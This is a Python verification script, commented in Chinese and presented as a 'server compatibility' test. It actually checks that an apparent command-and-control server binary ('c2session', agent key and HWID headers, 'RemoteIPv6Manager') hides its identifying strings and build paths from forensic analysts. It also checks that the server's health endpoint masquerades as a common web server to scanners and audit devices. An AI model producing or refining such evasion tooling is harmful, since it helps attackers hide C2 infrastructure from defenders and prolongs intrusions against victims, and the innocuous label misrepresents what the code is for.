# -*- coding: utf-8 -*-
"""服务端兼容性适配判据实测 —— 静态（二进制字符串）+ 动态（HTTP 标识）两层。

为什么必须是两层：
  · 静态层说明"取证者拿到磁盘上的二进制能看到什么"
  · 动态层说明"扫描器/审计设备打一发 HTTP 能看到什么"
  只做静态会漏掉最容易被发现的那一层：/api/health 会直接自报服务名。

用法：
    python verify_server_obf.py <server.exe>            # 只做静态
    python verify_server_obf.py <server.exe> --live URL # 额外做动态（需服务在跑）
"""
import argparse
import json
import re
import subprocess
import sys
import urllib.request

# 静态层：不应以明文出现在二进制里的高识别度字面量
BANNED = [
    b"X-Agent-Key", b"X-Agent-HWID", b"c2session",
    b"r6m-server", b"RemoteIPv6Manager", b"r6m-server.exe",
]
# 这些是"Go 编译产物固有特征"，不作为失败项，只报告（消除它们是另一层工作）
GO_INHERENT = [b"go1.", b"Go build", b"golang", b"net/http", b"runtime.g", b"sync."]


def static_scan(exe):
    d = open(exe, "rb").read()
    print(f"══ 静态层：{exe}（{len(d)} 字节）══")
    fails = []
    for x in BANNED:
        n = d.count(x)
        tag = "PASS" if n == 0 else "FAIL"
        if n:
            fails.append(x)
        print(f"  [{tag}] 明文 {x.decode('latin1'):20s} 命中 {n}")
    print("  ── Go 固有特征（非失败项，仅报告）──")
    for x in GO_INHERENT:
        n = d.count(x)
        if n:
            print(f"       {x.decode('latin1'):12s} {n}")
    # 构建路径泄漏（Go 默认把绝对路径编进二进制）
    # 注意：字符类里不能写 \u 转义（Python re 会报 bad escape）——
    # 中文用 [^\x00] 之类宽匹配代替，判据只看"是否出现盘符 + .go"。
    leaked = re.findall(rb"[A-Za-z]:[\\/][^\x00\r\n]{0,80}?\.go", d)
    tag = "PASS" if not leaked else "FAIL"
    print(f"  [{tag}] 源码绝对路径泄漏 {len(leaked)} 处"
          + (f"  例: {leaked[0][:70]!r}" if leaked else "  （-trimpath 生效）"))
    if leaked:
        fails.extend(leaked[:1])
    return not fails


def live_scan(url):
    print(f"══ 动态层：{url} ══")
    ok = True
    try:
        req = urllib.request.Request(url.rstrip("/") + "/api/health",
                                     headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8, context=_no_verify()) as r:
            body = r.read().decode("utf-8", "replace")
            hdrs = dict(r.headers)
    except Exception as e:
        print(f"  [SKIP] 连接失败（服务未运行？）: {e}")
        return True
    print(f"  响应体: {body[:200]}")
    print("  响应头:")
    for k, v in hdrs.items():
        print(f"       {k}: {v}")

    # 判据 1：body 不得含服务名/版本
    bad = [w for w in ("r6m", "RemoteIPv6", "r6m-server") if w.lower() in body.lower()]
    print(f"  [{'PASS' if not bad else 'FAIL'}] 回包不含服务名/版本" + (f"  命中 {bad}" if bad else ""))
    ok = ok and not bad

    # 判据 2：必须有常见的服务器标识（伪装得像真服务，而不是"什么都不发"）
    has_srv = any(k.lower() == "server" for k in hdrs)
    print(f"  [{'PASS' if has_srv else 'FAIL'}] 存在 Server 头（伪装为常见 Web 服务器）")
    ok = ok and has_srv

    # 判据 3：Go 默认不会加这些安全头，缺了说明伪装没生效
    for k in ("X-Content-Type-Options", "X-Frame-Options"):
        has = any(kk.lower() == k.lower() for kk in hdrs)
        print(f"  [{'PASS' if has else 'FAIL'}] 存在 {k}")
        ok = ok and has
    return ok


def _no_verify():
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("exe")
    ap.add_argument("--live", default=None, help="例如 https://127.0.0.1:8443")
    a = ap.parse_args()
    ok = static_scan(a.exe)
    if a.live:
        ok = live_scan(a.live) and ok
    print(f"══ 结论：{'全部判据通过' if ok else '存在未通过判据'} ══")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
